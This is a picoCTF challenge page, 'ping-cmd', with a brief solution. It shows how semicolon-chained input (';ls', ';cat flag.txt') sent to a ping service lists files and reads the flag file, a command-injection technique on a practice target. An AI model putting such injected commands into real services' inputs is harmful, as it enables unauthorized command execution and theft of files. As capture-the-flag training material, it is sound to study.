ping-cmd
General Skills
Easy
100 pts
7,560 solves
by Yahaya Meddy
Can you make the server reveal its secrets? It seems to be able to ping Google DNS, but what happens if you get a little creative with your input?

You can connect to the service here nc mysterious-sea.picoctf.net 57100

Hints
The program uses a shell command behind the scenes.

Sometimes, You can run more than one command at a time.

Answer:
Enter an IP address to ping! (We have tight security because we only allow '8.8.8.8'): ; ls
flag.txt
script.sh

Enter an IP address to ping! (We have tight security because we only allow '8.8.8.8'): ; cat flag.txt
[FLAG]